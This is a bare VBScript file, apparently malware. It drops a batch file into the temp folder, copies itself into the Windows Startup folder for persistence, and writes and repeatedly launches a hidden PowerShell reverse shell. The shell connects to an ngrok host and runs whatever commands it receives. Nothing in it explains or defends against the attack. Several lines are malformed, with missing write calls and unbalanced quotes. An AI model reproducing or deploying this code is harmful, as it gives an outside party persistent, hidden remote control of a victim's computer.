Set objShell = CreateObject("WScript.Shell")
objShell.Run "%temp%\pro.bat", 0, True

Dim temp
temp = "%temp%" 
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Do
        If fso.FileExists(temp & "\pro.bat") Then
            Dim objShell
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run temp & "\pro.bat", 0, False
        Else
            Dim temp_dir
            Set objShell = CreateObject("WScript.Shell")
            temp_dir = objShell.ExpandEnvironmentStrings("%temp%")
            objShell.CurrentDirectory = temp_dir
            Set objFSO = CreateObject("Scripting.FileSystemObject")
            Set objFile = objFSO.CreateTextFile(temp_dir & "\pro.bat")
            objFile.WriteLine "@echo off"
            objFile.WriteLine "move ""%temp%\start.vbs"" ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"""
            objFile.WriteLine ":loop"
            objFile.WriteLine "set FILE=%temp%\sh.ps1"
            objFile.WriteLine "if not exist %FILE% ("
            objFile.WriteLine     "("
            objFile.WriteLine         "echo $ip = ""0.tcp.eu.ngrok.io""
            objFile.WriteLine         "echo $port = 17307"
            objFile.WriteLine         "echo."
            objFile.WriteLine         "echo while ^($true^) ^{"
            objFile.WriteLine         "echo      try ^{"
                                      "echo          $client = New-Object System.Net.Sockets.TcpClient^($ip, $port^)"
                                      "echo          $stream = $client.GetStream^(^)"
                                      "echo          $writer = New-Object System.IO.StreamWriter^($stream^)"
                                      "echo          $reader = New-Object System.IO.StreamReader^($stream^)"
                                      "echo."
                                      "echo          function Execute-Command ^{"  
                                      "echo               param^([string]$cmd^)"
                                      "echo."
                                      "echo               $output = $errorOutput = $null"
                                      "echo."
                                      "echo               try ^{"                
                                      "echo                    $output = Invoke-Expression -Command $cmd"
                                      "echo               ^} catch ^{" 
                                      "echo                   $errorOutput = $_.Exception.Message"
                                      "echo               ^}"
                                      "echo."        
                                      "echo               return $output, $errorOutput"
                                      "echo          ^}"        
                                      "echo."                
                                      "echo          while ^($true^) ^{"          
                                      "echo              $prompt = ^(Get-Location^).Path + "> ""
                                      "echo              $writer.Write^($prompt^)"
                                      "echo              $writer.Flush^(^)"          
                                      "echo."
                                      "echo              $command = $reader.ReadLine^(^)"
                                      "echo."
                                      "echo              if ^($command -eq "exit"^) ^{"            
                                      "echo                  break"
                                      "echo              ^}"
                                      "echo."                   
                                      "echo              $output, $errorOutput = Execute-Command -cmd $command"
                                      "echo."               
                                      "echo              $writer.WriteLine^($output -join "`n"^)"
                                      "echo              $writer.WriteLine^($errorOutput^)"
                                      "echo              $writer.Flush^(^)"
                                      "echo           ^}"   
                                      "echo        ^} catch ^{"
                                      "echo."    
                                      "echo        ^} finally ^{"
                                      "echo            $client.Close^(^)"
                                      "echo        ^}"
                                      "echo." 
                                      "echo."    
                                      "echo        Start-Sleep -Seconds 40"
                                      "echo    ^}"    
                                  ") > %FILE%"
                              ") else ("
                                 "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%temp%\sh.ps1""
                                 "timeout /t 100 >nul"
                              ")"
                              "goto loop"
            objFile.Close
            objShell.Run temp_dir & "\pro.bat", 0, False
        End If
        WScript.Sleep 900000
Loop

